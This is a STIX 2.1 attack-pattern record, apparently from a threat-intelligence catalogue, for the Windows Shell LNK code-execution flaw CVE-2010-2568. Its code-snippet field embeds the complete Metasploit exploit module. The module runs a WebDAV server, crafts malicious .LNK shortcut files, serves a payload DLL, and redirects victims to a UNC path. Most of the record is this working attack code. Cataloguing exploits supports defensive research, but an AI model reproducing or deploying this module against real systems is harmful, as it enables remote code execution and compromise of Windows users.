{
    "type": "attack-pattern",
    "spec_version": "2.1",
    "id": "attack-pattern--21b6fcf9-df91-4b3a-b920-c04fa338d166",
    "created": "2024-08-14T16:45:04.927491Z",
    "modified": "2024-08-14T16:45:04.927495Z",
    "name": "Microsoft Windows Shell LNK Code Execution",
    "description": " This module exploits a vulnerability in the handling of Windows Shortcut files (.LNK) that contain an icon resource pointing to a malicious DLL. This module creates a WebDAV service that can be used to run an arbitrary payload when accessed as a UNC path. ",
    "external_references": [
        {
            "source_name": "metasploit",
            "url": "https://github.com/rapid7/metasploit-framework/blob/master/exploits/windows/browser/ms10_046_shortcut_icon_dllloader.rb",
            "external_id": "ms10_046_shortcut_icon_dllloader.rb"
        },
        {
            "source_name": "CVE",
            "external_id": "2010-2568"
        }
    ],
    "x_code_snippet": "##\n# This module requires Metasploit: https://metasploit.com/download\n# Current source: https://github.com/rapid7/metasploit-framework\n##\n\nclass MetasploitModule < Msf::Exploit::Remote\n  Rank = ExcellentRanking\n\n  #\n  # This module acts as an HTTP server\n  #\n  include Msf::Exploit::Remote::HttpServer::HTML\n  include Msf::Exploit::EXE\n\n  def initialize(info = {})\n    super(update_info(info,\n      'Name'\t\t\t=> 'Microsoft Windows Shell LNK Code Execution',\n      'Description'\t=> %q{\n          This module exploits a vulnerability in the handling of Windows\n        Shortcut files (.LNK) that contain an icon resource pointing to a\n        malicious DLL. This module creates a WebDAV service that can be used\n        to run an arbitrary payload when accessed as a UNC path.\n      },\n      'Author'\t\t=>\n        [\n          'hdm',   # Module itself\n          'jduck', # WebDAV implementation, UNCHOST var\n          'B_H'    # Clean LNK template\n        ],\n      'License'\t\t=> MSF_LICENSE,\n      'References'\t=>\n        [\n          ['CVE', '2010-2568'],\n          ['OSVDB', '66387'],\n          ['MSB', 'MS10-046']\n        ],\n      'DefaultOptions' =>\n        {\n          'EXITFUNC' => 'process',\n        },\n      'Payload'\t\t=>\n        {\n          'Space'\t=> 2048,\n        },\n      'Platform'\t\t=> 'win',\n      'Targets'\t\t=>\n        [\n          [ 'Automatic',\t{ } ]\n        ],\n      'DisclosureDate' => '2010-07-16',\n      'DefaultTarget'  => 0))\n\n    register_options(\n      [\n        OptPort.new(\t'SRVPORT',\t\t [ true,  \"The daemon port to listen on (do not change)\", 80 ]),\n        OptString.new(\t'URIPATH',\t\t [ true,  \"The URI to use (do not change).\", \"/\" ]),\n        OptString.new( 'UNCHOST',      [ false, \"The host portion of the UNC path to provide to clients (ex: 1.2.3.4).\" ])\n      ])\n\n    deregister_options('SSL', 'SSLVersion') # Just for now\n  end\n\n  def on_request_uri(cli, request)\n\n    case request.method\n    when 'OPTIONS'\n      process_options(cli, request)\n    when 'PROPFIND'\n      process_propfind(cli, request)\n    when 'GET'\n      process_get(cli, request)\n    else\n      print_error(\"Unexpected request method encountered: #{request.method}\")\n      resp = create_response(404, \"Not Found\")\n      resp.body = \"\"\n      resp['Content-Type'] = 'text/html'\n      cli.send_response(resp)\n    end\n\n  end\n\n  def process_get(cli, request)\n\n    myhost = (datastore['SRVHOST'] == '0.0.0.0') ? Rex::Socket.source_address(cli.peerhost) : datastore['SRVHOST']\n    webdav = \"\\\\\\\\#{myhost}\\\\\"\n\n    if (request.uri =~ /\\.dll$/i)\n      print_status \"Sending DLL payload\"\n      return if ((p = regenerate_payload(cli)) == nil)\n      data = generate_payload_dll({ :code => p.encoded })\n      send_response(cli, data, { 'Content-Type' => 'application/octet-stream' })\n      return\n    end\n\n    if (request.uri =~ /\\.lnk$/i)\n      print_status \"Sending LNK file\"\n\n      data = generate_link(\"#{@exploit_unc}#{@exploit_dll}\")\n\n      send_response(cli, data, { 'Content-Type' => 'application/octet-stream' })\n      return\n    end\n\n    print_status \"Sending UNC redirect\"\n    resp = create_response(200, \"OK\")\n\n    resp.body = %Q|<html><head><meta http-equiv=\"refresh\" content=\"0;URL=#{@exploit_unc}\"></head><body></body></html>|\n\n    resp['Content-Type'] = 'text/html'\n    cli.send_response(resp)\n  end\n\n  #\n  # OPTIONS requests sent by the WebDav Mini-Redirector\n  #\n  def process_options(cli, request)\n    print_status(\"Responding to WebDAV OPTIONS request\")\n    headers = {\n      'MS-Author-Via' => 'DAV',\n#\t\t\t'DASL'          => '<DAV:sql>',\n#\t\t\t'DAV'           => '1, 2',\n      'Allow'         => 'OPTIONS, GET, PROPFIND',\n      'Public'        => 'OPTIONS, GET, PROPFIND'\n    }\n    resp = create_response(207, \"Multi-Status\")\n    resp.body = \"\"\n    resp['Content-Type'] = 'text/xml'\n    cli.send_response(resp)\n  end\n\n  #\n  # PROPFIND requests sent by the WebDav Mini-Redirector\n  #\n  def process_propfind(cli, request)\n    path = request.uri\n    print_status(\"Received WebDAV PROPFIND request for #{path}\")\n    body = ''\n\n    my_host   = (datastore['SRVHOST'] == '0.0.0.0') ? Rex::Socket.source_address(cli.peerhost) : datastore['SRVHOST']\n    my_uri    = \"http://#{my_host}/\"\n\n    if path =~ /\\.dll$/i\n      # Response for the DLL\n      print_status(\"Sending DLL multistatus for #{path} ...\")\n      body = %Q|<?xml version=\"1.0\" encoding=\"utf-8\"?>\n<D:multistatus xmlns:D=\"DAV:\" xmlns:b=\"urn:uuid:c2f41010-65b3-11d1-a29f-00aa00c14882/\">\n<D:response xmlns:lp1=\"DAV:\" xmlns:lp2=\"http://apache.org/dav/props/\">\n<D:href>#{path}#{@exploit_dll}</D:href>\n<D:propstat>\n<D:prop>\n<lp1:resourcetype/>\n<lp1:creationdate>2010-07-19T20:29:42Z</lp1:creationdate>\n<lp1:getcontentlength>#{rand(0x100000)+128000}</lp1:getcontentlength>\n<lp1:getlastmodified>Mon, 19 Jul 2010 20:29:42 GMT</lp1:getlastmodified>\n<lp1:getetag>\"#{\"%.16x\" % rand(0x100000000)}\"</lp1:getetag>\n<lp2:executable>T</lp2:executable>\n<D:supportedlock>\n<D:lockentry>\n<D:lockscope><D:exclusive/></D:lockscope>\n<D:locktype><D:write/></D:locktype>\n</D:lockentry>\n<D:lockentry>\n<D:lockscope><D:shared/></D:lockscope>\n<D:locktype><D:write/></D:locktype>\n</D:lockentry>\n</D:supportedlock>\n<D:lockdiscovery/>\n<D:getcontenttype>application/octet-stream</D:getcontenttype>\n</D:prop>\n<D:status>HTTP/1.1 200 OK</D:status>\n</D:propstat>\n</D:response>\n</D:multistatus>\n|\n\n      resp = create_response(207, \"Multi-Status\")\n      resp.body = body\n      resp['Content-Type'] = 'text/xml'\n      cli.send_response(resp)\n      return\n    end\n\n    if path =~ /\\.lnk$/i\n      # Response for the DLL\n      print_status(\"Sending DLL multistatus for #{path} ...\")\n      body = %Q|<?xml version=\"1.0\" encoding=\"utf-8\"?>\n<D:multistatus xmlns:D=\"DAV:\" xmlns:b=\"urn:uuid:c2f41010-65b3-11d1-a29f-00aa00c14882/\">\n<D:response xmlns:lp1=\"DAV:\" xmlns:lp2=\"http://apache.org/dav/props/\">\n<D:href>#{path}#{@exploit_lnk}</D:href>\n<D:propstat>\n<D:prop>\n<lp1:resourcetype/>\n<lp1:creationdate>2010-07-19T20:29:42Z</lp1:creationdate>\n<lp1:getcontentlength>#{rand(0x100)+128}</lp1:getcontentlength>\n<lp1:getlastmodified>Mon, 19 Jul 2010 20:29:42 GMT</lp1:getlastmodified>\n<lp1:getetag>\"#{\"%.16x\" % rand(0x100000000)}\"</lp1:getetag>\n<lp2:executable>T</lp2:executable>\n<D:supportedlock>\n<D:lockentry>\n<D:lockscope><D:exclusive/></D:lockscope>\n<D:locktype><D:write/></D:locktype>\n</D:lockentry>\n<D:lockentry>\n<D:lockscope><D:shared/></D:lockscope>\n<D:locktype><D:write/></D:locktype>\n</D:lockentry>\n</D:supportedlock>\n<D:lockdiscovery/>\n<D:getcontenttype>shortcut</D:getcontenttype>\n</D:prop>\n<D:status>HTTP/1.1 200 OK</D:status>\n</D:propstat>\n</D:response>\n</D:multistatus>\n|\n\n      resp = create_response(207, \"Multi-Status\")\n      resp.body = body\n      resp['Content-Type'] = 'text/xml'\n      cli.send_response(resp)\n      return\n    end\n\n    if path !~ /\\/$/\n\n      if path.index(\".\")\n        print_status(\"Sending 404 for #{path} ...\")\n        resp = create_response(404, \"Not Found\")\n        resp['Content-Type'] = 'text/html'\n        cli.send_response(resp)\n        return\n      else\n        print_status(\"Sending 301 for #{path} ...\")\n        resp = create_response(301, \"Moved\")\n        resp[\"Location\"] = path + \"/\"\n        resp['Content-Type'] = 'text/html'\n        cli.send_response(resp)\n        return\n      end\n    end\n\n    print_status(\"Sending directory multistatus for #{path} ...\")\n    body = %Q|<?xml version=\"1.0\" encoding=\"utf-8\"?>\n<D:multistatus xmlns:D=\"DAV:\" xmlns:b=\"urn:uuid:c2f41010-65b3-11d1-a29f-00aa00c14882/\">\n  <D:response xmlns:lp1=\"DAV:\" xmlns:lp2=\"http://apache.org/dav/props/\">\n    <D:href>#{path}</D:href>\n    <D:propstat>\n      <D:prop>\n        <lp1:resourcetype><D:collection/></lp1:resourcetype>\n        <lp1:creationdate>2010-07-19T20:29:42Z</lp1:creationdate>\n        <lp1:getlastmodified>Mon, 19 Jul 2010 20:29:42 GMT</lp1:getlastmodified>\n        <lp1:getetag>\"#{\"%.16x\" % rand(0x100000000)}\"</lp1:getetag>\n        <D:supportedlock>\n          <D:lockentry>\n            <D:lockscope><D:exclusive/></D:lockscope>\n            <D:locktype><D:write/></D:locktype>\n          </D:lockentry>\n          <D:lockentry>\n            <D:lockscope><D:shared/></D:lockscope>\n            <D:locktype><D:write/></D:locktype>\n          </D:lockentry>\n        </D:supportedlock>\n        <D:lockdiscovery/>\n        <D:getcontenttype>httpd/unix-directory</D:getcontenttype>\n      </D:prop>\n    <D:status>HTTP/1.1 200 OK</D:status>\n  </D:propstat>\n</D:response>\n|\n\n\n    subdirectory = %Q|\n<D:response xmlns:lp1=\"DAV:\" xmlns:lp2=\"http://apache.org/dav/props/\">\n<D:href>#{path}#{Rex::Text.rand_text_alpha(6)}/</D:href>\n<D:propstat>\n<D:prop>\n<lp1:resourcetype><D:collection/></lp1:resourcetype>\n<lp1:creationdate>2010-07-19T20:29:42Z</lp1:creationdate>\n<lp1:getlastmodified>Mon, 19 Jul 2010 20:29:42 GMT</lp1:getlastmodified>\n<lp1:getetag>\"#{\"%.16x\" % rand(0x100000000)}\"</lp1:getetag>\n<D:supportedlock>\n<D:lockentry>\n<D:lockscope><D:exclusive/></D:lockscope>\n<D:locktype><D:write/></D:locktype>\n</D:lockentry>\n<D:lockentry>\n<D:lockscope><D:shared/></D:lockscope>\n<D:locktype><D:write/></D:locktype>\n</D:lockentry>\n</D:supportedlock>\n<D:lockdiscovery/>\n<D:getcontenttype>httpd/unix-directory</D:getcontenttype>\n</D:prop>\n<D:status>HTTP/1.1 200 OK</D:status>\n</D:propstat>\n</D:response>\n|\n\n    files = %Q|\n<D:response xmlns:lp1=\"DAV:\" xmlns:lp2=\"http://apache.org/dav/props/\">\n<D:href>#{path}#{@exploit_dll}</D:href>\n<D:propstat>\n<D:prop>\n<lp1:resourcetype/>\n<lp1:creationdate>2010-07-19T20:29:42Z</lp1:creationdate>\n<lp1:getcontentlength>#{rand(0x100000)+128000}</lp1:getcontentlength>\n<lp1:getlastmodified>Mon, 19 Jul 2010 20:29:42 GMT</lp1:getlastmodified>\n<lp1:getetag>\"#{\"%.16x\" % rand(0x100000000)}\"</lp1:getetag>\n<lp2:executable>T</lp2:executable>\n<D:supportedlock>\n<D:lockentry>\n<D:lockscope><D:exclusive/></D:lockscope>\n<D:locktype><D:write/></D:locktype>\n</D:lockentry>\n<D:lockentry>\n<D:lockscope><D:shared/></D:lockscope>\n<D:locktype><D:write/></D:locktype>\n</D:lockentry>\n</D:supportedlock>\n<D:lockdiscovery/>\n<D:getcontenttype>application/octet-stream</D:getcontenttype>\n</D:prop>\n<D:status>HTTP/1.1 200 OK</D:status>\n</D:propstat>\n</D:response>\n\n<D:response xmlns:lp1=\"DAV:\" xmlns:lp2=\"http://apache.org/dav/props/\">\n<D:href>#{path}#{@exploit_lnk}</D:href>\n<D:propstat>\n<D:prop>\n<lp1:resourcetype/>\n<lp1:creationdate>2010-07-19T20:29:42Z</lp1:creationdate>\n<lp1:getcontentlength>#{rand(0x100)+128}</lp1:getcontentlength>\n<lp1:getlastmodified>Mon, 19 Jul 2010 20:29:42 GMT</lp1:getlastmodified>\n<lp1:getetag>\"#{\"%.16x\" % rand(0x100000000)}\"</lp1:getetag>\n<lp2:executable>T</lp2:executable>\n<D:supportedlock>\n<D:lockentry>\n<D:lockscope><D:exclusive/></D:lockscope>\n<D:locktype><D:write/></D:locktype>\n</D:lockentry>\n<D:lockentry>\n<D:lockscope><D:shared/></D:lockscope>\n<D:locktype><D:write/></D:locktype>\n</D:lockentry>\n</D:supportedlock>\n<D:lockdiscovery/>\n<D:getcontenttype>shortcut</D:getcontenttype>\n</D:prop>\n<D:status>HTTP/1.1 200 OK</D:status>\n</D:propstat>\n</D:response>\n|\n    if request[\"Depth\"].to_i > 0\n      if path.scan(\"/\").length < 2\n        body << subdirectory\n      else\n        body << files\n      end\n    end\n\n    body << \"</D:multistatus>\"\n\n    body.gsub!(/\\t/, '')\n\n    # send the response\n    resp = create_response(207, \"Multi-Status\")\n    resp.body = body\n    resp['Content-Type'] = 'text/xml; charset=\"utf8\"'\n    cli.send_response(resp)\n  end\n\n  def generate_link(unc)\n    uni_unc = unc.unpack(\"C*\").pack(\"v*\")\n    path = ''\n    path << [\n      0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x6a, 0x00, 0x00, 0x00, 0x00,\n      0x00, 0x00, 0x00, 0x00, 0x00, 0x00\n    ].pack(\"C*\")\n    path << uni_unc\n\n    # LinkHeader\n    ret = [\n      0x4c, 0x00, 0x00, 0x00, 0x01, 0x14, 0x02, 0x00, 0x00, 0x00, 0x00, 0x00, 0xc0, 0x00, 0x00, 0x00,\n      0x00, 0x00, 0x00, 0x46, 0xff, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,\n      0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,\n      0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,\n      0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00\n    ].pack('C*')\n\n    idlist_data = ''\n    idlist_data << [0x12 + 2].pack('v')\n    idlist_data << [\n      0x1f, 0x00, 0xe0, 0x4f, 0xd0, 0x20, 0xea, 0x3a, 0x69, 0x10, 0xa2, 0xd8, 0x08, 0x00, 0x2b, 0x30,\n      0x30, 0x9d\n    ].pack('C*')\n    idlist_data << [0x12 + 2].pack('v')\n    idlist_data << [\n      0x2e, 0x1e, 0x20, 0x20, 0xec, 0x21, 0xea, 0x3a, 0x69, 0x10, 0xa2, 0xdd, 0x08, 0x00, 0x2b, 0x30,\n      0x30, 0x9d\n    ].pack('C*')\n    idlist_data << [path.length + 2].pack('v')\n    idlist_data << path\n    idlist_data << [0x00].pack('v') # TERMINAL WOO\n\n    # LinkTargetIDList\n    ret << [idlist_data.length].pack('v') # IDListSize\n    ret << idlist_data\n\n    # ExtraData blocks (none)\n    ret << [rand(4)].pack('V')\n\n    # Patch in the LinkFlags\n    ret[0x14, 4] = [\"10000001000000000000000000000000\".to_i(2)].pack('N')\n    ret\n  end\n\n  def exploit\n\n    unc = \"\\\\\\\\\"\n    if (datastore['UNCHOST'])\n      unc << datastore['UNCHOST'].dup\n    else\n      unc << ((datastore['SRVHOST'] == '0.0.0.0') ? Rex::Socket.source_address('50.50.50.50') : datastore['SRVHOST'])\n    end\n    unc << \"\\\\\"\n    unc << rand_text_alpha(rand(8)+4)\n    unc << \"\\\\\"\n\n    @exploit_unc  = unc\n    @exploit_lnk  = rand_text_alpha(rand(8)+4) + \".lnk\"\n    @exploit_dll  = rand_text_alpha(rand(8)+4) + \".dll\"\n\n    if datastore['SRVPORT'].to_i != 80 || datastore['URIPATH'] != '/'\n      fail_with(Failure::Unknown, 'Using WebDAV requires SRVPORT=80 and URIPATH=/')\n    end\n\n    print_status(\"Send vulnerable clients to #{@exploit_unc}.\")\n    print_status(\"Or, get clients to save and render the icon of http://<your host>/<anything>.lnk\")\n\n    super\n  end\nend\n",
    "x_mitre_disclosure_date": "2010-07-16",
    "x_mitre_platforms": [
        "win'"
    ]
}